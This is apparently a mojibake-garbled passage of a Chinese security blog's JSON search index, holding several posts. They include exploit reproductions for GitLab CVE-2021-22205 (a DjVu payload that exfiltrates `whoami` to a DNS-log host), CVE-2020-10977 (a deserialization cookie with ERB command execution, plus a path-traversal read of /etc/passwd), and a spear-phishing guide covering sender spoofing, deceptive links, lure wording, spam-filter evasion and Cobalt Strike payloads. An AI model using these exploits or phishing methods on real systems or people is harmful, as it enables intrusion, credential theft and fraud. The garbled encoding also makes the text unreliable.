    "content"  : "å¤ç°Createanewsnippetç™»å½•åˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œå¹¶ä¸”åˆ›å»ºæ–°çš„snippetInthedescriptionfield,hit\"Attachafile\";Selectanduplaodecho_vakzz.jpgecho_vakzz.jpgä¸Šä¼ é™„ä»¶Seethatthefile/tmp/vakzzhasbeencreatedontheserverä¹Ÿå¯ä»¥é€šè¿‡æœªæˆæƒRCEï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹(CVE-2021-22205)RCE-ä¸ƒã€æ‰‹å·¥å¤ç°-æœªæˆæƒåˆ¶ä½œrceå›¾ç‰‡å¯ç›´æ¥ç¼–è¾‘ï¼Œä¿®æ”¹ä¸‹é¢çš„ä»£ç å°±å¥½ï¼›æˆ–è€…ä¸Šé¢çš„æ–‡ç« ä¸­[å…­ã€æ‰‹å·¥å¤ç°-æœ‰æˆæƒ-2DjVuæ ¼å¼å›¾ç‰‡åˆ¶ä½œæ–¹å¼]ä¹Ÿæœ‰ç›¸åº”çš„åˆ¶ä½œæ–¹æ³•ã€‚qx{ping`whoami`.5pxha.i3ntq7.bnslog.top}æ•ˆæœåˆ†æå¦‚ä½œè€…åœ¨æŠ¥å‘Šé‡Œæ‰€è¯´ï¼šWhenuploadingimagefiles,GitLabWorkhorsepassesanyfileswiththeextensions[jpg|jpeg|tiff]throughtoExifTooltoremoveanynon-whitelistedtags.ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLabWorkhorseä¼šå°†ä»»ä½•æ‰©å±•åä¸ºjpg|jpeg|tiffçš„æ–‡ä»¶ä¼ é€’ç»™ExifToolï¼Œä»¥åˆ é™¤ä»»ä½•æœªåˆ—å…¥ç™½åå•çš„æ ‡ç­¾ã€‚funcIsExifFile(filenamestring)bool{\tfilenameMatch:=regexp.MustCompile(`(?i)\\.(jpg|jpeg|tiff)$`)\treturnfilenameMatch.MatchString(filename)}OneofthesupportedformatsisDjVu.WhenparsingtheDjVuannotation,thetokensareevaledtoâ€œconvertCescapesequencesâ€.(metadata\t(Copyright\"\\\".qx{echovakzz&gt;/tmp/vakzz}.\\\"b\"))å‚è€ƒHackerOne-RCEwhenremovingmetadatawithExifToolGitLabè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2021-22205)"
  },

  {
    "title"    : "é±¼å‰æ”»å‡»ç­–ç•¥è½åœ°ï¼šé‚®ä»¶ç½‘å…³åº”ç”¨",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/2022-05-17-Harpoon-strategy-attack-EmailGateway-usage/",
    "date"     : "May 17, 2022",
    "content"  : "å®ç°ï¼šå¦‚ä½•å°½å¯èƒ½å¿«çš„è½åœ°é‚®ä»¶ç½‘å…³ï¼Œå¹¶å®ç°å…·æœ‰ä¸€å®šæ¬ºéª—æ€§çš„é’“é±¼é‚®ä»¶ã€‚é›¶ã€å¿«é€Ÿä¸Šåœºæˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯SendCloudï¼Œæ³¨å†Œè¿›å…¥åå…ˆåé¡ºåºï¼šæ·»åŠ åŸŸåDNSéªŒè¯å¦‚ä½•åœ¨DNSå¹³å°ä¸Šé…ç½®åŸŸåï¼Ÿåˆ›å»ºAPI_USERå¹¶å…³è”åŸŸåå¾—åˆ°apiuseråŠapikeyæ·»åŠ é‚®ä»¶æ¨¡ç‰ˆå¾—åˆ°templateInvokeNameä¸è¿‡ä¸Šé¢çš„SendCloudå¹³å°ï¼Œå…è´¹æ–¹æ¡ˆè‡³å¤šåªå…è®¸æ¯å¤©10å°é‚®ä»¶ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹æ›´å¤šè§£å†³æ–¹æ¡ˆç‚¹å‡»æŸ¥çœ‹è¿™é‡Œåˆ°æ­¤ä¸ºæ­¢æˆ‘ä»¬é…ç½®å®Œæˆï¼Œä¸Šé¢æœ‰ä¸‰ä¸ªå€¼éœ€è¦æˆ‘ä»¬è®°ä¸‹ï¼Œè¿›å…¥SendCloudDOCé¡µé¢æ‰¾åˆ°å‘é€ä»£ç doc/email_v2/code/ä»£ç ç¤ºä¾‹Python::æ¨¡æ¿å‘é€æ‚¨ä¹Ÿå¯ä»¥è‡ªè¡Œé€‰æ‹©ä¸åŒè¯­è¨€ï¼›ä¸‹è½½å¹¶æŠŠç›¸å…³çš„é…ç½®å‚æ•°å¡«å…¥ï¼Œè‡ªå®šä¹‰ï¼šfromNamefromsubjectè¿è¡Œå³å¯ï¼špython3sendcloud_bin4xin_telecom.py{\"result\":true,\"statusCode\":200,\"message\":\"è¯·æ±‚æˆåŠŸ\",\"info\":{\"emailIdList\":[\"1$nd0$bin4xin[at]sentrylab.cn\"]}}ç„¶åæˆ‘ä»¬å°±ä¼šæ”¶åˆ°ä¸€å°æœ‰ä¸€å®šå…·æœ‰è¿·æƒ‘æ€§çš„é‚®ä»¶ï¼šå®¢æˆ·ç«¯æ•ˆæœï¼šæ‰‹æœºç«¯æ•ˆæœï¼šä¸è¿‡è¿™æ ·æ˜¯æœ‰å±€é™æ€§çš„ï¼Œæœ‰å¿ƒçš„è¯å¯ä»¥é€šè¿‡webç«¯æ‰“å¼€ï¼Œç”šè‡³éƒ½ä¸ç”¨æ‰“å¼€é‚®ä»¶è¯¦æƒ…çœ‹ï¼šå‘ä»¶äººï¼šç½‘ç»œå’Œä¿¡æ¯å®‰å…¨ç®¡ç†éƒ¨-ç»ˆç«¯å¨èƒç®¡ç†éƒ¨é—¨&lt;soc_adminis[at]***lecom.com.cn&gt;(ç”±ce2b1168-d591-1***.comä»£å‘)ä¸€ã€é“¾æ¥å°ç»†èŠ‚åŸŸåpunycodeç¼–ç åŸç†ç®€å•çš„è¶…é“¾æ¥&lt;ahref=\"http://www.eval.me\"&gt;www.aliyun.com&lt;/a&gt;â€¦äºŒã€é’“é±¼å†…å®¹ç›¸å…³ä»¥ä¸‹å†…å®¹å†™çš„å¾ˆè´´åˆ‡ï¼Œæˆ‘è¿™é‡Œåšäº†è½¬è½½:é’“é±¼é‚®ä»¶çš„æŠ•é€’å’Œä¼ªé€ é’“é±¼é‚®ä»¶é€šå¸¸æœ‰ä¸¤å¤§ç±»ï¼Œä¸€ç§æ˜¯é“¾æ¥é’“é±¼é‚®ä»¶ï¼Œé€šå¸¸æ˜¯æƒ³å„ç§åŠæ³•è®©ç›®æ ‡æ‰“å¼€ç½‘ç«™ï¼Œè¾“å…¥å¯†ç ã€‚å¦ä¸€ç§æ˜¯é™„ä»¶é’“é±¼é‚®ä»¶ï¼Œä½†ä¸ç®¡å“ªä¸€ç±»ï¼Œéƒ½éœ€è¦ä¸€ä¸ªå¥½çš„æ–‡æ¡ˆæ¥è®©ç›®æ ‡ç‚¹å‡»æˆ–è€…ä¸‹è½½ã€‚ä¸€å°æˆåŠŸçš„é’“é±¼é‚®ä»¶ï¼Œä¸€ä¸ªå¥½çš„æ–‡æ¡ˆæ˜¯å¿…é¡»çš„ï¼Œä¸€ä¸ªè®©äººçœ‹äº†åå¯èƒ½ä¼šå»ç‚¹çš„æ–‡æ¡ˆï¼Œéœ€è¦å…·å¤‡ä»¥ä¸‹å‡ ä¸ªè¦ç´ ï¼šé‡è¦æ€§é¦–å…ˆå¾—è®©ä½“ç°å‡ºæ¥é‚®ä»¶çš„é‡è¦æ€§ï¼Œæ¥é©±ä½¿ç›®æ ‡å»æŸ¥çœ‹é‚®ä»¶ã€‚åˆç†æ€§å…¶æ¬¡æ–‡æ¡ˆå¾—åŸºæœ¬åˆç†ï¼Œè¿™ä¸ªå°±éœ€è¦ç»“åˆç›®æ ‡çš„èº«ä»½ï¼Œæ—¥å¸¸ä¹ æƒ¯ï¼Œæ‰€åœ¨å…¬å¸çš„æƒ…å†µåŠä¸šåŠ¡è¿›è¡Œç»¼åˆè€ƒé‡ï¼Œæ¥ç¼–å†™å‡ºä¸€ä¸ªåˆç†çš„æ–‡æ¡ˆã€‚ç´§è¿«æ€§æœ€åæ–‡æ¡ˆæœ€å¥½æœ‰ä¸€äº›ç´§è¿«æ€§ï¼Œæ¥ä¿ƒä½¿ç›®æ ‡å°½å¿«çš„å»æŒ‰ç…§æ–‡æ¡ˆå¼•å¯¼ï¼Œè¿›è¡Œç‚¹å‡»ã€è¾“å…¥ç­‰æ“ä½œã€‚ä¸‰ã€å‚è€ƒé’“é±¼é‚®ä»¶çš„æŠ•é€’å’Œä¼ªé€ SendCloudAPIDOCSpunycodeä»¥ä¸Šã€‚"
  },

  {
    "title"    : "é±¼å‰æ”»å‡»ç­–ç•¥è½åœ°ï¼šä»é›¶åˆ°ä¸€",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Harpoon-strategy-attack-from-0-to-1/",
    "date"     : "May 16, 2022",
    "content"  : "é‚®ä»¶ç½‘å…³çš„é€‰æ‹©é±¼å‰æ”»å‡»ç­–ç•¥è½åœ°ï¼šé‚®ä»¶ç½‘å…³åº”ç”¨é’“é±¼é‚®ä»¶çš„æŠ•é€’å’Œä¼ªé€ æé«˜é€è¾¾æˆåŠŸç‡é€‚å½“æ§åˆ¶å‘ä¿¡çš„é¢‘ç‡ï¼Œå¦‚æœçŸ­æ—¶é—´å†…å‘åŒä¸€ä¸ªé‚®ç®±åœ°å€å‘ä¿¡ï¼Œä¹Ÿä¼šå®¹æ˜“è¢«æ ‡è®°ä¸ºåƒåœ¾é‚®ä»¶ã€‚æœ€å¥½å‘åŒä¸€é‚®ç®±å‘ä¿¡é—´éš”åœ¨2-5å¤©å°†è¾ƒå¤§çš„æ”¶ä»¶äººåˆ—è¡¨åˆ†å‰²æˆè‹¥å¹²ä¸ªå°çš„ï¼Œåˆ†æ—¶é—´æ®µå‘é€ä½¿ç”¨å˜é‡ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œé‚®ä»¶æœåŠ¡å™¨å¤šæ¬¡æ”¶åˆ°æ¥è‡ªåŒä¸€ä¸ªé‚®ä»¶IPåœ°å€çš„ç›¸åŒå†…å®¹é‚®ä»¶ï¼Œå¾ˆå®¹æ˜“å°±è¢«åˆ¤å®šä¸ºåƒåœ¾é‚®ä»¶ã€‚åœ¨è¿›è¡Œé‚®ä»¶ç¼–è¾‘æ—¶ï¼Œå¤šé‡‡ç”¨å˜é‡è®¾ç½®ï¼Œåƒå…¬å¸åã€æ”¶ä»¶äººï¼Œå¯ä»¥è¿›è¡Œå˜é‡æ·»åŠ ï¼Œé¿å…é‚®ä»¶å†…å®¹å®Œå…¨ä¸€è‡´è½½è·/CobaltStikeCobaltStikeå¤‡å¿˜å½•I:COBALTSTIKEæœåŠ¡å™¨æ­å»ºå†ç¨‹CobaltStikeå¤‡å¿˜å½•II:COBALTSTIKEæœåŠ¡å™¨éšè—çœŸå®IPCSä¸Šçº¿æœ¨é©¬å…æ€å…¥é—¨è¿™ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬é‚®ä»¶ä¸­çš„payload/è½½è·ï¼Œé’“é±¼é‚®ä»¶ä¸ç®¡æ˜¯å‘é€é™„ä»¶ä¸Šçº¿è¿˜æ˜¯é’“é±¼ç½‘ç«™ï¼Œæˆ‘ä»¬æ€»è¦å¯¹è¾“å‡ºçš„â€äº§å“â€æ¥è¿‘å®Œå–„ï¼Œä¸ç®¡å“ªä¸€ç±»ï¼Œéƒ½éœ€è¦ä¸€ä¸ªå¥½çš„æ–‡æ¡ˆæ¥è®©ç›®æ ‡ç‚¹å‡»æˆ–è€…ä¸‹è½½ã€‚å‘æ–‡ä¿¡æ¯æœé›†ç¡®å®šç”¨æˆ·/å‘˜å·¥é‚®ç®±é¶æ ‡ç¡®å®šå‘æ–‡å†…å®¹å‘æ–‡å•ä½å¸¸è§å‘æ–‡å£å»å‘æ–‡åŸŸåä¼ªé€ ä¸Šé¢ä¸¤ä¸ªå°èŠ‚å…¶å®æœ‰å¾ˆå¤šç»†èŠ‚å¯ä»¥æ·±ç©¶ï¼ŒåŒ…æ‹¬CSç«¯çš„æŒ‡çº¹å»é™¤é˜²æ­¢è¢«ç½‘ç»œæµ‹ç»˜ï¼ŒCDNä¸Šçº¿ç­‰ç­‰ã€‚å‚è€ƒé’“é±¼é‚®ä»¶çš„æŠ•é€’å’Œä¼ªé€ SendCloudAPIDOCSpunycode"
  },

  {
    "title"    : "GitLab CVE-2020-10977 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¯¼è‡´çš„RCE",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/GitLab-CVE-2020-10977-RCE/",
    "date"     : "May 5, 2022",
    "content"  : "æ¦‚è¿°GitLabæ˜¯ä¸€ä¸ªç”¨äºä»“åº“ç®¡ç†ç³»ç»Ÿçš„å¼€æºé¡¹ç›®ï¼Œä½¿ç”¨Gitä½œä¸ºä»£ç ç®¡ç†å·¥å…·ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„webæœåŠ¡ã€‚GitLabæ˜¯ç”±GitLabInc.å¼€å‘ä½¿ç”¨MITè®¸å¯è¯çš„åŸºäºç½‘ç»œçš„Gitä»“åº“ç®¡ç†å·¥å…·ï¼Œä¸”å…·æœ‰wikiå’Œissueè·Ÿè¸ªåŠŸèƒ½ã€‚ä½¿ç”¨Gitä½œä¸ºä»£ç ç®¡ç†å·¥å…·ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„webæœåŠ¡ã€‚å¦‚ä½•æŸ¥çœ‹GitlabWebç‰ˆæœ¬https://git-lab-domain.com/helpå¦‚æœæ²¡æœ‰ç›¸å…³ç‰ˆæœ¬ï¼Œé‚£ä¹ˆéœ€è¦å…ˆç™»å½•å¦‚æœæ‚¨æ˜¯è¿ç»´äººå‘˜ï¼Œå¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š$cat/opt/gitlab/embedded/service/gitlab-rails/VERSIONé›¶ã€æ¦‚è¿°ç”±GitLabCVE-2020-10977ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¯¼è‡´çš„RCE0x01ã€å½±å“ç‰ˆæœ¬æš‚æœªå¯çŸ¥ï¼›é€šè¿‡ä½œè€…åœ¨Hackeroneçš„æŠ¥å‘Šæ˜¾ç¤ºæµ‹è¯•ç¯å¢ƒæ˜¯ï¼šGitLabinformationVersion:12.8.7-eeRevision:2643fd87200å¹¶ä¸”é€šè¿‡Gitlabå®˜æ–¹çš„åé¦ˆæ˜¯ï¼šYourfindinghasbeenpatchedinGitLabversion12.9.1æˆ–è®¸ç»“åˆæ¼æ´æ¥æºï¼Œä¸€ä¸ªå¯å‚è€ƒçš„è¯´æ³•æ˜¯ï¼šGitLabGitLabCE/EE&gt;=8.5and&lt;12.9GitLabGitLabCE&gt;=8.5ï¼Œ&lt;12.90x02ã€ç¯å¢ƒæ­å»ºæœåŠ¡/å—å®³ç«¯$dockerrun-itgitlab/gitlab-ee:{version.label}bashæˆ–è€…yumå®‰è£…ï¼›æˆ‘è¿™é‡Œçš„æœ¬åœ°ç¯å¢ƒæ˜¯é€‰æ‹©ä¸æŠ¥å‘Šè€…@vakzzä¸€æ ·çš„ç‰ˆæœ¬GitLabinformationVersion:12.8.7-eeRevision:2643fd87200Directory:/opt/gitlab/embedded/service/gitlab-railsDBAdapter:PostgreSQLç‚¹å‡»ä»¥ä¸‹è½½GitLabVer12.8.7-eeæˆ–è€…ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ä¸‹è½½ï¼šon:push:branches:-main-'releases/**'wget--content-dispositionhttps://packages.gitlab.com/gitlab/gitlab-ee/packages/scientific/7/gitlab-ee-12.8.7-ee.0.el7.x86_64.rpm/download.rpmå®‰è£…yum-yinstall./gitlab......12_8.7.rpmTIPS:1.gitlab-ctlrestartåè®¿é—®Gitlabè¿”å›502ï¼Œå†è¿è¡Œgitlab-ctlreconfigureå³å¯ã€‚2.gitlab-ctlreconfigureå¦‚æœæŠ¥é”™Nosuchfileordirectoryï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤touch/opt/gitlab/embedded/etc/90-omnibus-gitlab-kernel.sem.conftouch/opt/gitlab/embedded/etc/90-omnibus-gitlab-kernel.shmall.conftouch/opt/gitlab/embedded/etc/90-omnibus-gitlab-net.core.somaxconn.conf0x03ã€å¤ç°æ”»å‡»ç«¯ï¼šå…ˆpullé•œåƒï¼Œæ–¹ä¾¿ç”¨consoleç”Ÿæˆååºåˆ—åŒ–Cookiedockerpullgitlab/gitlab-ee:12.8.1-ee.0è¿›å…¥console$/opt/gitlab/embedded/bin/runsvdir-start&amp;$gitlab-ctlreconfigure$vi/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml#æ›¿æ¢secret_key_baseä¸ºæœåŠ¡/å—å®³ç«¯çš„secret_key_base$gitlab-railsconsoleéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¿®æ”¹é…ç½®ymlæ–‡ä»¶åï¼Œå°±ä¸éœ€è¦reconfigureäº†ï¼Œä¸ç„¶ç”Ÿæˆæ–°çš„secret_key_baseä¼šè¦†ç›–ä¿®æ”¹çš„ã€‚gitlab-railsconsoleæ”»å‡»ä»£ç request=ActionDispatch::Request.new(Rails.application.env_config)request.env[\"action_dispatch.cookies_serializer\"]=:marshalcookies=request.cookie_jarerb=ERB.new(\"&lt;%=`echofromCVE-2020-10977&gt;/tmp/flags`%&gt;\")depr=ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,\"@result\",ActiveSupport::Deprecation.new)cookies.signed[:cookie]=deprputscookies[:cookie]è®¿é—®ï¼š$curl-k-vvv'https://git-lab-domain.com/users/sign_in'-b\"experimentation_subject_id={cookies[:cookie]}\"å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿç¼–å†™äº†ç›¸å…³çš„EXPä¾›æŸ¥é˜…ï¼Œæƒå½“æŠ›ç –å¼•ç‰ï¼›Bigger-than-Bigger::CoVV/Gitlab/CVE-2020-10977::cookie_generater.shC(ollection)O(f)V(erified)V(ulnerabilities):cookie_generater.shinhttps://github.com/Bin4xin/bigger-than-biggerAuthor:bin4xin&lt;bin4xin@sentrylab.cn&gt;Bashscriptstogeneratecookiesoutof[gitlab-railsconsole].(RCEduetoCVE-2020-10977&lt;localfileread&gt;)visithttps://hackerone.com/reports/827052______||__(_)______________||_||_________||__(_)___________|'_\\||/_\\|/_\\|/-_)|'_||___||_||'\\/_|||'\\|___||'_\\||/_\\|/_\\|/-_)|'_||_.__/|_|\\__,|\\__,|\\___||_|\\__||_||_|\\__,_||_||_||_.__/|_|\\__,|\\__,|\\___||_||___/|___/|___/|___/USAGE:bashcookie_generater.shcommand[$command][$url]SUCHAS:bashcookie_generater.sh[cmd|--cmd|-c]\"touch/tmp/success\"8.8.8.8[help|--help|-h]:\t\tprinthelpmessage.æ‰“å°å¸®åŠ©ä¿¡æ¯[cmd|--cmd|-c]:\t\tgeneratecookiesmode.ç”ŸæˆCOOKIE[$command]:\t\tcommandyouwanttoexecute.è¦æ‰§è¡Œçš„å‘½ä»¤[$url]:\t\tgitlabvulnurl(unnecessary).gitlabåœ°å€ï¼Œéå¿…è¦æœ‰å…´è¶£å¯ä»¥ç‚¹å‡»é“¾æ¥æŸ¥çœ‹ï¼Œæ¬¢è¿æ–§æ­£ã€‚ä¸€ã€æ€è€ƒ1x01ã€ä»£ç åˆ†æ#/opt/gitlab/embedded/service/gitlab-rails/config/initializers/cookies_serializer.rb#Besuretorestartyourserverwhenyoumodifythisfile.Rails.application.config.action_dispatch.use_cookies_with_metadata=falseRails.application.config.action_dispatch.cookies_serializer=:hybridä½œè€…æåˆ°cookies_serializer.rbä¸­é»˜è®¤çš„cookies_serializer=:hybridå¯¼è‡´äº†RCEï¼›å¤šè¯´ä¸€å¥ï¼Œæ’å…¥Cookieè¿™ä¸ªåˆ©ç”¨æ–¹å¼å’ŒShiroååºåˆ—åŒ–WEBåˆ©ç”¨æ–¹å¼æœ‰ç‚¹åƒ(o_O)äºŒã€ä¿®å¤2x01ã€å…³é—­æ³¨å†ŒåŠŸèƒ½å¤§éƒ¨åˆ†é—®é¢˜éƒ½æ˜¯é€šè¿‡åŒ¿åç”¨æˆ·æ³¨å†Œåï¼Œåœ¨ä»“åº“å†…æ“ä½œå¯¼è‡´çš„é—®é¢˜ï¼Œæ•…ï¼šå–æ¶ˆæ¸¸å®¢çš„æ³¨å†Œèƒ½å¤Ÿå‡å°‘80%çš„é—®é¢˜ä»¥Adminç”¨æˆ·ç™»å½•åï¼Œè¿›å…¥ï¼šAdminArea-&gt;Setting-&gt;Sign-uprestrictionsç¡®ä¿Sign-upRestrictionsä¸‹Sign-upenabledä¸ºæœªå‹¾é€‰çŠ¶æ€ã€‚2x02ã€æ›´æ–°ç‰ˆæœ¬ä½†å–æ¶ˆæ³¨å†Œåï¼Œæˆ–è®¸ä»ç„¶æœ‰ä¸€äº›ä¸éœ€è¦æˆæƒçš„æ¼æ´ï¼Œæ‰€ä»¥å°½å¯èƒ½ä¿æŒè½¯ä»¶çš„ç‰ˆæœ¬ä¸ä¸Šæ¸¸ç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼›ä¸‰ã€å‚è€ƒäº2022-10-21ä¿®æ”¹Hackerone-ArbitraryfilereadviatheUploadsRewriterwhenmovingandissueGithub404::CVE-2020-10977Gitlabä»»æ„æ–‡ä»¶è¯»å–å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡ŒGitLabä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°(CVE-2020-10977)GitLabä»»æ„æ–‡ä»¶è¯»å–æ¼æ´CVE-2020-10977HackTheBoxâ€”LaboratoryWriteupCentOS7æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»ºgitlabç¯å¢ƒgitlabæ³¨é”€æ³¨å†ŒåŠŸèƒ½"
  },

  {
    "title"    : "GitLab CVE-2020-10977 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/GitLab-CVE-2020-10977/",
    "date"     : "Apr 29, 2022",
    "content"  : "æ¦‚è¿°GitLabæ˜¯ä¸€ä¸ªç”¨äºä»“åº“ç®¡ç†ç³»ç»Ÿçš„å¼€æºé¡¹ç›®ï¼Œä½¿ç”¨Gitä½œä¸ºä»£ç ç®¡ç†å·¥å…·ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„webæœåŠ¡ã€‚GitLabæ˜¯ç”±GitLabInc.å¼€å‘ä½¿ç”¨MITè®¸å¯è¯çš„åŸºäºç½‘ç»œçš„Gitä»“åº“ç®¡ç†å·¥å…·ï¼Œä¸”å…·æœ‰wikiå’Œissueè·Ÿè¸ªåŠŸèƒ½ã€‚ä½¿ç”¨Gitä½œä¸ºä»£ç ç®¡ç†å·¥å…·ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„webæœåŠ¡ã€‚å¦‚ä½•æŸ¥çœ‹GitlabWebç‰ˆæœ¬https://git-lab-domain.com/helpå¦‚æœæ²¡æœ‰ç›¸å…³ç‰ˆæœ¬ï¼Œé‚£ä¹ˆéœ€è¦å…ˆç™»å½•å¦‚æœæ‚¨æ˜¯è¿ç»´äººå‘˜ï¼Œå¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š$cat/opt/gitlab/embedded/service/gitlab-rails/VERSION12.8.1-eeé›¶ã€CVE-2020-109770x01ã€CVE-2020-10977æ¼æ´æ¦‚è¿°åœ¨Gitlab8.5-12.9ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€å¤„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ï¼Œåœ¨ä¸éœ€è¦ç‰¹æƒçš„çŠ¶æ€ä¸‹ï¼Œè¯»å–ä»»æ„æ–‡ä»¶ï¼Œé€ æˆä¸¥é‡ä¿¡æ¯æ³„éœ²ï¼Œä»è€Œå¯¼è‡´è¿›ä¸€æ­¥è¢«æ”»å‡»çš„é£é™©ã€‚0x02ã€å½±å“ç‰ˆæœ¬GitLabGitLabCE/EE&gt;=8.5and&lt;=12.9GitLabGitLabCE&gt;=8.5ï¼Œ&lt;=12.90x03ã€ç¯å¢ƒæ­å»ºç‚¹å‡»ä»¥æŸ¥çœ‹æœ¬åœ°æ­å»ºæ¼æ´ç‰ˆæœ¬æ­¤å¤„ä¸å¤šèµ˜è¿°[root@ingeekbin4xin]#systemctlstopfirewalld#CentOSå…³é—­é˜²ç«å¢™[root@ingeekbin4xin]#systemctldisablefirewalld.service#CentOSå–æ¶ˆé˜²ç«å¢™è‡ªå¯åŠ¨[root@ingeekbin4xin]#systemctlstatusfirewalldâ—firewalld.service-firewalld-dynamicfirewalldaemonLoaded:loaded(/usr/lib/systemd/system/firewalld.service;enabled;vendorpreset:enabled)Active:inactive(dead)sinceWed2022-05-0422:11:30EDT;4sagoDocs:man:firewalld(1)Process:7299ExecStart=/usr/sbin/firewalld--nofork--nopid$FIREWALLD_ARGS(code=exited,status=0/SUCCESS)MainPID:7299(code=exited,status=0/SUCCESS)May0422:10:48ingeeksystemd[1]:Stoppedfirewalld-dynamicfirewalldaemon.May0422:10:48ingeeksystemd[1]:Startingfirewalld-dynamicfirewalldaemon...May0422:10:48ingeeksystemd[1]:Startedfirewalld-dynamicfirewalldaemon.May0422:10:48ingeekfirewalld[7299]:WARNING:AllowZoneDriftingisenabled.Thisisconsideredaninsecureconfigurationoption.Itwillberemovedinafuturerelease.Pleaseconsiderdisablingitnow.May0422:11:29ingeeksystemd[1]:Stoppingfirewalld-dynamicfirewalldaemon...May0422:11:30ingeeksystemd[1]:Stoppedfirewalld-dynamicfirewalldaemon.æˆ–è€…Dockerï¼šReplicatingtheGitLabCE12.8.1Environment$sudoaptinstalldocker.io$dockerpullgitlab/gitlab-ce:12.8.1-ce.0$dockerrungitlab/gitlab-ce:12.8.1-ce.0Itwilltakefewminstorunthecontainertostart,inanewterminalwecancheckthedockerprocessandsimultaneouslygetashellonit.0x04ã€æ¼æ´å¤ç°1.åœ¨é¦–é¡µéšä¾¿åˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»é™†ï¼›2.ç™»å½•ååˆ›å»ºä¸¤ä¸ªproject/ä»“åº“ï¼Œåå­—éšæ„ï¼›3.ä¸¤ä¸ªprojectåˆ›å»ºå®Œæˆåï¼Œåœ¨test1ä¸­åˆ›å»ºä¸€ä¸ªissuesã€‚å¡«å…¥payloadï¼›![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)4.æäº¤åï¼Œå°†è¿™ä¸ªåˆ›å»ºå¥½çš„issuesmoveåˆ°å‰é¢åˆ›å»ºå¥½çš„å¦å¤–ä¸€ä¸ªproject/ä»“åº“ä¸­ï¼›4.1è¿›å…¥issues-&gt;ç¼–è¾‘-&gt;ç§»åŠ¨5.ç‚¹å‡»passwdé™„ä»¶6.enjoyä¸€ã€CVE-2020-10977æ€è€ƒä¸ºä»€ä¹ˆç§»åŠ¨issuesçš„æ—¶å€™ï¼Œå¯ä»¥è¯»å–åˆ°æ–‡ä»¶å‘¢ï¼Ÿ1x01ã€çŒœæµ‹æ˜¾è€Œæ˜“è§ï¼Œå½“åˆ›å»ºissuesçš„æ—¶å€™ï¼Œæˆ‘ä»¬æäº¤ä¸Šå»çš„markdownä»£ç è¢«è§£ææˆäº†htmlä»£ç ï¼Œå³ï¼š&lt;imgsrc=\"https://git-lab-domain.com/ysoserial/ysoserial/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd\"alt=\"a\"&gt;é‚£ä¹ˆé—®é¢˜è‚¯å®šå‡ºç°åœ¨ä»£ç ç§»åŠ¨æ—¶ï¼Œé”™è¯¯è§£æåˆ°äº†æœ¬åœ°æ–‡ä»¶ä¸Šï¼Œé‚£ä¹ˆæ˜¯å“ªé‡Œå‘¢ï¼Ÿå¸¦ç€è¿™æ ·çš„ç–‘é—®ï¼Œå»æŸ¥çœ‹äº†ç›¸å…³çš„æ–‡ç« å’Œä»£ç ï¼›Hackerone-ArbitraryfilereadviatheUploadsRewriterwhenmovingandissue1x02ã€ä»£ç åˆ†æä½œè€…æå‡ºï¼šTheUploadsRewriterdoesnotvalidatethefilename,allowingarbitraryfilestobecopiedviadirectorytraversalwhenmovinganissuetoanewproject.Thepatternusedtolookforreferencesis:UploadsRewriterä¸éªŒè¯æ–‡ä»¶åï¼Œå…è®¸åœ¨å°†é—®é¢˜ç§»åŠ¨åˆ°æ–°é¡¹ç›®æ—¶é€šè¿‡ç›®å½•éå†å¤åˆ¶ä»»æ„æ–‡ä»¶ï¼Œå¯»æ‰¾å¼•ç”¨çš„æ¨¡å¼å¦‚ä¸‹ï¼šMARKDOWN_PATTERN=%r{\\!?\\[.*?\\]\\(/uploads/(?&lt;secret&gt;[0-9a-f]{32})/(?&lt;file&gt;.*?)\\)}.freeze%rä¸ºæ­£åˆ™è¡¨è¾¾ï¼Œç”¨æ³•å¯ä»¥å‚è€ƒï¼šç›¸å…³ç”¨æ³•å¹¶ä¸”ï¼šThisisusedbytheUploadsRewriterwhencopyinganissuetoalsocopyacrossthefiles:åœ¨å½“æ‹·è´issueæ—¶åŒæ—¶ä¹Ÿèƒ½å¤Ÿå®ç°èƒ½å¤Ÿè·¨æ–‡ä»¶å¤åˆ¶ï¼Œå°±æ˜¯å› 